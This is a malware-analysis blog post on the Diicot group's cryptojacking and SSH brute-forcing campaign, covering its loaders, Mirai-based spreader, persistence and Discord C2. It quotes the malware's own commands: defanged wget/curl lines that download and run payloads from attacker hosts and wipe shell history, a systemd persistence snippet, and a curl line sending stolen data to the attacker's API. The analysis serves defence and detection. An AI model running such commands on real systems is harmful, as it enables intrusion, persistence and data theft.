 <!-- wp:paragraph --></p> 
<!--more--><p>In a recent review of honeypot sensor telemetry, Cado researchers detected an interesting attack pattern that could be attributed to the threat actor Diicot (formerly, “Mexals”).</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Investigation of a C2 server used by Diicot led to the discovery of several payloads, some of which didn’t appear to have any public reporting and were missing from common public malware repositories. It appears that these payloads are being used as part of a new campaign by this emerging group.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>As this blog will discuss, Diicot capabilities and objectives include:</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:list --></p> 
<ul> 
 <!-- wp:list-item --> 
 <li>The deployment of a self-propagating initial access tool</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>Use of custom packers to obfuscate binary payloads</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>Widespread cryptojacking on compromised targets</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>Identification of vulnerable systems via internet scanning</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>Personal data exposure of perceived enemies (doxxing)</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>Deployment of a botnet agent implicated in DDoS attacks</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>C2 reporting via Discord and their own custom API endpoint</li> 
 <p> 
  <!-- /wp:list-item --></p> 
</ul> 
<p> 
 <!-- /wp:list --></p>

 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading --></p> 
<h2 class="wp-block-heading">Diicot Background</h2> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Information about Diicot is sparse, save for two excellent writeups by <a href="https://www.akamai.com/blog/security-research/mexals-cryptojacking-malware-resurgence">Akamai</a> and <a href="https://www.bitdefender.co.uk/blog/labs/how-we-tracked-a-threat-group-running-an-active-cryptojacking-campaign/">Bitdefender</a>. In summary, they appear to have been active since at least 2020 and are known for conducting cryptojacking campaigns and developing malware as a service (MaaS). The group originally referred to themselves as Mexals, but have since changed to the name Diicot.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The Diicot name is significant, as it’s also the name of the Romanian organised crime and anti-terrorism policing unit. In addition, artifacts from the group’s campaigns contain messaging and imagery related to this organisation. This, combined with the presence of Romanian-language strings and log statements in the payloads themselves, have led prior researchers to attribute the malware to a group based in Romania. Cado Labs research concurs with this.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Although Diicot have traditionally been associated with cryptojacking campaigns, Cado Labs discovered evidence of the group deploying an off-the-shelf Mirai-based botnet agent, named Cayosin. Deployment of this agent was targeted at routers running the Linux-based embedded devices operating system, <a href="https://openwrt.org/">OpenWrt</a>.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The use of Cayosin demonstrates Diicot’s willingness to conduct a variety of attacks (not just cryptojacking) depending on the type of targets they encounter. This finding is consistent with Akamai’s research, suggesting that the group are still investing engineering effort into deploying Cayosin. In doing so, Diicot have gained the ability to conduct DDoS attacks, as this is the primary objective of Cayosin according to previous <a href="https://securityaffairs.co/80858/cyber-crime/cayosin-botnet-mmd.html">reporting</a>.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Not only do Diicot have the ability to conduct cryptojacking and DDoS attacks, but investigation of one of their servers led to the discovery of a Romanian-language video depicting a feud between the group and what appears to be other online personas.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>It is suspected that these personas are members of a rival hacking group. During the course of the video, members of the rival group are mentioned and their personal details, including photographs, home addresses, full names and online handles are exposed (known as doxxing). From this, it can be concluded that the group are actively involved in doxxing members of the public, in addition to the nefarious activities mentioned above.</p> 
<p> 
 <!-- /wp:paragraph --></p>

<p>For the purpose of avoiding overlap with existing research on Diicot, this blog will provide a brief overview of Diicot’s Tactics, Techniques and Procedures (TTPs) along with the execution chain employed by the group in their latest campaign, before focusing on the latest version of their self-propagating SSH brute-forcer.</p>

 <!-- /wp:paragraph --></p>

 <!-- wp:paragraph --></p>

 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading --></p> 
<h2 class="wp-block-heading">Diicot Tactics, Techniques and Procedures (TTPs)</h2> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Attributing a campaign to Diicot is often straightforward, thanks to the group’s relatively distinctive TTPs. Prior research has shown that Diicot make heavy use of the <a href="https://github.com/neurobin/shc">Shell Script Compiler</a> (<code>shc</code>), presumably to make analysis of their loader scripts more difficult. They also frequently pack their payloads with a custom version of UPX, using a header modified with the bytes <code>0x59545399</code>. This byte sequence is easily identified by tools like <a href="https://github.com/horsicq/Detect-It-Easy">Detect it Easy</a> and, in combination with a specified offset, can be used as a detection mechanism for the group’s binary payloads.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"align":"center","id":7484,"sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image aligncenter size-full"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/image1-44.png" alt="" class="wp-image-7484"> 
 <br> 
 <figcaption class="wp-element-caption"> 
  <em>Example modified UPX header</em> 
 </figcaption> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Use of a modified UPX header prevents unpacking via the standard <code>upx -d</code><em> </em>command. Fortunately, Akamai researcher Larry Cashdollar created the excellent <a href="https://github.com/lcashdol/UPX"><em>upx_dec</em></a> utility to circumvent this. Running the tool restores the header to the format that UPX expects, allowing the binary to be unpacked as normal.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Diicot also rely heavily on Discord for C2. Discord supports HTTP POST requests to a webhook URL, allowing exfiltrated data and campaign statistics to be viewed within a given channel. Cado researchers identified four distinct channels used for this campaign, details of which can be found in the Indicators of Compromise section. Thanks to the inclusion of Snowflake timestamps in the hook URLs, it’s possible to view their creation date. This confirms that the campaign is recent and ongoing.</p> 
<p> 
 <!-- /wp:paragraph --></p>

<p> 
 <!-- wp:heading --></p> 
<h2 class="wp-block-heading">Payload Execution</h2> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Diicot campaigns generally involve a long execution chain, with individual payloads and their outputs forming interdependent relationships.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p><code>shc</code> executables are typically used as loaders and prepare the system for mining via Diicot’s custom fork of XMRig, along with registering persistence. Executables written in Golang tend to be dedicated to scanning, brute-forcing and propagation, and a fork of the <a href="https://zmap.io/"><code>zmap</code></a> internet scanning utility has often been observed.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The execution chain itself remains largely consistent with the campaign described by Akamai earlier this year, with updates to the payloads themselves observed during Cado Labs’ analysis.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"align":"center","id":7490,"sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image aligncenter size-full"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/image6-23.png" alt="" class="wp-image-7490"> 
 <br> 
 <figcaption class="wp-element-caption"> 
  <em>Chain of Execution</em> 
 </figcaption> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading {"level":3} --></p> 
<h3 class="wp-block-heading">aliases</h3> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Initial access for the Diicot campaign is via a custom SSH brute-forcing tool, named <code>aliases</code>. This <a href="https://www.virustotal.com/gui/file/de6dff4d3de025b3ac4aff7c4fab0a9ac4410321f4dca59e29a44a4f715a9864">executable</a> is a 64-bit ELF written in Golang, and is responsible for ingesting a list of target IP addresses and username/password pairs to conduct a brute force attack. More on this later.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading {"level":3} --></p> 
<h3 class="wp-block-heading">bins.sh</h3> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Executed if <code>aliases</code> encounters an <a href="https://en.wikipedia.org/wiki/OpenWrt">OpenWrt</a> router during the initial access phase. <code>bins.sh</code> is a fairly generic Mirai-style spreader script that attempts to retrieve versions of the Cayosin botnet’s agent for multiple architectures.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading {"level":3} --></p> 
<h3 class="wp-block-heading">cutie.&lt;arch&gt;</h3> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>A series of 32-bit ELF binaries retrieved by <code>bins.sh</code> if an OpenWrt router is encountered.&nbsp; <code>cutie.&lt;arch&gt;</code> is a variant of Mirai, specifically <a href="https://twitter.com/malwaremustd1e/status/1297821500435726336?lang=en">Cayosin</a>. Cursory inspection of the ARM <a href="https://www.virustotal.com/gui/file/b328bfa242c063c8cfd33bc8ce82abeefc33b5f8e34d0515875216a322954b01">variant</a> in VirusTotal shows a high detection ratio, with most vendors detecting the executable as Mirai. This suggests that the malware hasn’t really been customised by Diicot for this campaign.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading {"level":3} --></p> 
<h3 class="wp-block-heading">payload</h3> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>A 64-bit ELF <code>shc</code> executable that simply calls out to <code>bash</code> and runs a shell script in memory. The script acts as a loader, preparing the target system for cryptocurrency mining, changing the password of the current user and installing XMRig if the target has more than 4 processor cores.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>When changing the user’s password, some simple logic is included to determine whether the user ID is equal to 0 (root). If so, the password is changed to a hardcoded value of <code>$6$REY$R1FGJ.zbsJS/fe9eGkeS1pdWgKbdszOxbUs/E0KtxPsRE9jUCIXkxtC" "MJ9bB1YwOYhKWSSbr/' </code>(inclusive of whitespace and double quotes).&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>If the user is not root, <code>payload</code> will generate a password by running the <code>date</code> command, piping this through <code>sha256sum</code> and then through <code>base64</code>. The first 8 characters of the result are then used for the password itself.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p><code>payload</code> also removes any artifacts of prior compromise (a common preparatory action taken by cryptojacking groups) and reports information such as <code>username</code>, <code>password</code>, IP address and number of cores back to an attacker-controlled IP.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading {"level":3} --></p> 
<h3 class="wp-block-heading">.diicot</h3> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Another <code>shc</code> executable serving as a loader for an additional executable named <code>Opera</code>, which is the XMRig miner deployed by Diicot. <code>.diicot</code> begins with an existence check for <code>Opera</code> and retrieves it along with a XMRig configuration file if it doesn’t exist. The details of the mining configuration are viewable in the Indicators of Compromise section.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>After retrieving and executing the miner, <code>.diicot</code> registers an attacker-controlled SSH key to maintain access to the system. It also creates a simple script under the path <code>/var/tmp/Documents/.b4nd1d0</code> which is used to relaunch the miner if it’s not running and executes this via cron at a frequency of every minute.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The sample also checks whether the SSH daemon is running, and executes it if not, before proceeding to automate this functionality as part of a <code>systemd</code> service. The service is saved as <code>/lib/systemd/system/myservice.service</code> and is configured to execute on boot.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:loos-hcb/code-block {"langType":"bash","langName":"Bash"} --></p> 
<div class="hcb_wrap"> 
 <pre class="prism undefined-numbers lang-bash" data-lang="Bash"><code>echo '[Unit]<br>
Description=Example systemd service.<br>
[Service]" "=3600<br>
ExecStart=/bin/bash /usr/bin/sshd<br>
[Install]<br>
WantedBy=multi-user.target' &gt; /lib/systemd/system/myservice.service<br>
sleep 1<br>
chmod 644 /lib/systemd/system/myservice.service<br>
systemctl enable myservice<br>
systemctl start myservice</code></pre> 
</div> 
<p> 
 <!-- /wp:loos-hcb/code-block --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p><em>Example commands to register and load the sshd systemd service</em></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading {"level":3} --></p> 
<h3 class="wp-block-heading">Chrome</h3> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>An internet scanner that appears to be based on <a href="https://zmap.io/">Zmap</a>. The main difference between the Diicot fork and the original is the ability to write the scan results to a text file in the working directory, with a hardcoded name of <code>bios.txt</code>. This is then read by <code>aliases </code>as a target list for conducting SSH brute-forcing.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading {"level":3} --></p> 
<h3 class="wp-block-heading">Update</h3> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Another <code>shc</code> executable that retrieves <code>Chrome</code> and <code>aliases</code> if they don’t exist. <code>Update</code> also writes out a hardcoded username/password combination list to a file named <code>protocols</code> in the working directory. This is also read by <code>aliases</code> and used for SSH brute-forcing. <code>Update</code> also includes logic to generate a randomised <code>/16</code> network prefix. <code>Chrome</code> is then run against this address range. A <code>cronjob</code> is also created to run <code>History</code> and <code>Update</code> and is saved as <code>.5p4rk3l5</code> before being loaded.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading {"level":3} --></p> 
<h3 class="wp-block-heading">History</h3> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>A very simple plaintext (i.e. uncompiled) shell script that checks whether Update is running and executes it if not; the results of which are logged to standard out.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading --></p> 
<h2 class="wp-block-heading">Analysis of aliases</h2> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The sample of <code>aliases</code> we obtained was located at <code>45[.]88[.]67[.]94/.x/aliases</code>. The last modified header in the HTTP response indicates that it was uploaded to the server on the 27th of May when we first obtained it, but was updated again on June 5th.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading {"level":3} --></p> 
<h3 class="wp-block-heading">main</h3> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>This is the main entry point of the go binary. Upon launch, it performs a <code>HTTP GET</code> request to <code>hxxp://45[.]88[.]67[.]94/diicotapi/skema0803</code> (<code>skema0803</code> appears to be a hardcoded API key that appears in many Diicot samples). If this fails, or the response does not contain a Discord webhook, then the malware exits with an error message stating that the API was unreachable.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The malware then calls readLines on <code>bios.txt</code> to load a list of IPs to attack, and again on <code>protocols</code> to load a space-delimited list of credentials to attack each IP with. It repeats this process twice, once for port 22, and again for port 2000.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Once this is complete, it spawns a new goroutine (a lightweight thread) for each address and credential combination, with a small delay between each spawn. The goroutine executes the <code>remoteRun</code> function. The <code>main</code> thread applies a 60 second timeout to the goroutines, and exits once there are none left.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading {"level":3} --></p> 
<h3 class="wp-block-heading">init_0</h3> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The <code>init_0</code> function appears to be the result of go optimisation - it loads a number of variables into <code>qwords</code> in the <code>.bss</code> section of the binary, including a stringified shell script (referred to above as <code>payload</code>) that is ultimately run on compromised machines. These <code>qwords</code> are then used at various points in the malware.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Interestingly, there is another call here to the <code>diicotapi</code>, and the webhook retrieved is saved into a <code>qword</code>. This does not appear to be used anywhere, making it likely leftover from a previous iteration of<code> aliases</code>.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p>

 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading {"level":3} --></p> 
<h3 class="wp-block-heading">toDiscord&nbsp;</h3> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The <code>toDiscord</code> function takes in a string and concatenates it into a <code>curl </code>command, which is then executed via<code> bash</code>. As they have used the go HTTP client module elsewhere, it is unclear why they have decided to use <code>curl </code>instead of it.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"align":"center","id":7542,"sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image aligncenter size-full"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/Screen-Shot-2023-06-14-at-5_09_26-PM.png" alt="" class="wp-image-7542"> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading {"level":3} --></p> 
<h3 class="wp-block-heading">toFilter*</h3> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The three <code>toFilter </code>functions are the same as<code> toDiscord </code>but with different URLs. They are used later on to send details of the compromised machines to separate Discord channels based on the outcome of the payload script executed on freshly compromised machines. The payload either additionally deploys a cryptominer if the host has 4 or more cores, or just uses the host as a spreader if it has less - it would make sense that they would want to track which hosts are doing which.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading {"level":3} --></p> 
<h3 class="wp-block-heading">toApi</h3> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The <code>toApi</code> function is similar to the <code>toDiscord</code> and <code>toFilter</code> functions, but sends requests to the attacker’s API. The string passed into the function is first written to <code>/tmp/.txt</code>, and then base64 encoded and passed into an environmental variable called <code>haceru</code> (Romanian for hacker). It then executes <code>curl -s</code> <code>arhivehaceru[.]com:2121/api?haceru=$haceru</code> to report this string back to the C2 server.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading {"level":3} --></p> 
<h3 class="wp-block-heading">remoteRun</h3> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The <code>remoteRun</code> function takes in an IP, port, and credential pair. It uses the crypto/ssh go package to connect and attempt to authenticate using the details provided. After a successful login, a series of commands are executed to gather information about the compromised system:</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:list --></p> 
<ul> 
 <!-- wp:list-item --> 
 <li><code>uptime | grep -ohe 'up .*' | sed 's/,//g' | awk '{ print $2" "$3 }</code> 
  <!-- wp:list --> 
  <ul> 
   <!-- wp:list-item --> 
   <li>This fetches the uptime of the system, which can be useful for determining if the compromised system is a sandbox, which would likely have a low uptime.</li> 
   <p> 
    <!-- /wp:list-item --></p> 
  </ul> <p> 
   <!-- /wp:list --></p></li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li><code>lspci | egrep VGA&nbsp; &amp;&amp; lspci | grep 3D</code> 
  <!-- wp:list --> 
  <ul> 
   <!-- wp:list-item --> 
   <li>This fetches a list of graphics devices connected to the system, which can be used for mining cryptocurrency. However, diicot’s choice of crypto is Monero, which is typically CPU mined rather than GPU mined.</li> 
   <p> 
    <!-- /wp:list-item --></p> 
  </ul> <p> 
   <!-- /wp:list --></p></li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li><code>lscpu | egrep "Model name:" | cut -d ' ' -f 14-</code> 
  <!-- wp:list --> 
  <ul> 
   <!-- wp:list-item --> 
   <li>This fetches the model of CPU installed in the system, which will determine how quickly the server can mine Monero.</li> 
   <p> 
    <!-- /wp:list-item --></p> 
  </ul> <p> 
   <!-- /wp:list --></p></li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li><code>curl ipinfo.io/org</code> 
  <!-- wp:list --> 
  <ul> 
   <!-- wp:list-item --> 
   <li>This fetches the organisation associated with the ASN of the compromised machine's IP address.</li> 
   <p> 
    <!-- /wp:list-item --></p> 
  </ul> <p> 
   <!-- /wp:list --></p></li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li><code>nproc</code> 
  <!-- wp:list --> 
  <ul> 
   <!-- wp:list-item --> 
   <li>This fetches the number of processes running on the compromised machine. Sandboxes and honeypots will typically have less running processes, so this information assists diicot with determining if they are in a sandbox.</li> 
   <p> 
    <!-- /wp:list-item --></p> 
  </ul> <p> 
   <!-- /wp:list --></p></li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li><code>uname -s -v -n -r -m</code> 
  <!-- wp:list --> 
  <ul> 
   <!-- wp:list-item --> 
   <li>This fetches the system hostname, kernel &amp; operating system version information, and arch. This is used to determine whether to infect the machine or not, based on a string blacklist.</li> 
   <p> 
    <!-- /wp:list-item --></p> 
  </ul> <p> 
   <!-- /wp:list --></p></li> 
 <p> 
  <!-- /wp:list-item --></p> 
</ul> 
<p> 
 <!-- /wp:list --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Once this is complete, the malware checks that the output of <code>uname</code> contains <code>OpenWrt</code> . If it does, it executes the following command to download <code>bins.sh</code>, the Mirai spreader:</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:loos-hcb/code-block {"langType":"bash","langName":"Bash"} --></p> 
<div class="hcb_wrap"> 
 <pre class="prism undefined-numbers lang-bash" data-lang="Bash">&lt;code&gt;​​cd /var/tmp || cd /tmp/ ; wget -q hxxp://84[.]54[.]50[.]198/pedalcheta/bins.sh || curl -O -s -L hxxp://84[.]54[.]50[.]198/pedalcheta/bins.sh ; chmod 777 bins.sh; sh bins.sh ; rm -rf .* ; rm -rf * ; history -c ; rm -rf ~/.bash_history&lt;/code&gt;</pre> 
</div> 
<p> 
 <!-- /wp:loos-hcb/code-block --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The malware then continues (regardless of whether the system is running <code>OpenWrt</code>) to check the output of <code>uname</code> against a blacklist of strings, which include various cloud providers such as AWS, Linode, and Azure among more generic strings like specific kernel versions and specific services.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>It’s unclear why exactly this is, the most likely case is that once they detect that payload didn’t run properly (sent via one of the <code>toFilter </code>webhooks) they simply blacklist the uname to avoid trying to infect it in the future. It could also be to prevent the malware from running on honeypots, or cloud providers that are likely to detect the cryptominer. It also checks the architecture of the system, as <code>Opera</code>, the custom fork of XMRig, appears to be x86_64 only.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Once these checks have passed, the malware then runs the following script on the compromised host, which downloads and runs the shell script <code>payload</code>:</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:loos-hcb/code-block {"langType":"bash","langName":"Bash"} --></p> 
<div class="hcb_wrap"> 
 <pre class="prism undefined-numbers lang-bash" data-lang="Bash">&lt;code&gt;crontab -r ; cd /var/tmp ; rm -rf /dev/shm/.x ; mkdir /var/tmp/Documents &amp;gt; /dev/null 2&amp;gt;&amp;1 ; cd /var/tmp/ ; pkill Opera ; rm -rf xmrig  .diicot .black Opera ; rm -rf .black xmrig.1 ; pkill cnrig ; pkill java ; killall java ;  pkill xmrig ; killall cnrig ; killall xmrig ; wget -q arhivehaceru[.]com/payload || curl -O -s -L arhivehaceru[.]com/payload || wget -q 45[.]88[.]67[.]94/payload || curl -O -s -L 45[.]88[.]67[.]94/payload ; chmod 777 payload ; ./payload &amp;gt; /dev/null 2&amp;gt;&amp;1 &amp; disown ; history -c ; rm -rf .bash_history ~/.bash_history&lt;/code&gt;</pre> 
</div> 
<p> 
 <!-- /wp:loos-hcb/code-block --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Depending on the environment, <code>payload </code>performs different functions - it either additionally deploys a cryptominer if the host has 4 or more cores, or just uses the host as a spreader if it has less. To keep track of this, one of the three <code>toFilter</code> methods will be used depending on the output of the executed command. It constructs a Discord embed, and puts the credentials, IP, SSH port (22 or 2000), and output of the commands run during the discovery phase, and invokes the chosen toFilter function with this data in JSON form.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Regardless of the <code>toFilter</code> function chosen, the same embed is also passed to <code>toDiscord</code> and <code>toApi</code>.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading {"level":3} --></p> 
<h3 class="wp-block-heading">readLines</h3> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The <code>readLines</code> function is a fairly self-explanatory utility function that takes in a file path and reads it into a list of lines. This function is used to load in the IP addresses to attack and the credential combinations to try against them.</p> 
<p> 
 <!-- /wp:paragraph --></p>

 <!-- wp:heading --></p> 
<h2 class="wp-block-heading">Conclusion</h2> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Diicot are an emerging threat group with a range of objectives and the technical knowledge to act on them. This campaign specifically targets SSH servers exposed to the internet with password authentication enabled. The username/password list they use is relatively limited and includes default and easily-guessed credential pairs.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Cado Labs encourages readers to implement basic SSH hardening to defend against this malware family, including mandatory key-based authentication for SSH instances and implementation of firewall rules to limit SSH access to specific IPs.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>A lengthy and convoluted execution chain can make analysis of a Diicot campaign feel laborious. The group also employs basic obfuscation techniques, such as compiling shell scripts with <code>shc</code> and using a modified UPX header for their binary payloads. These techniques are easily bypassed as an analyst, often revealing executables without further obfuscation and with debug symbols intact.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The payloads themselves are often noisy in their operation, as is expected with any brute-forcing malware. Scanning attempts from Diicot’s fork of Zmap are particularly noisy, and can result in a multitude of outbound SYN packets to addresses within a random /16 network prefix. This activity should be easily identified by administrators with adequate network monitoring in place.</p> 
<p>
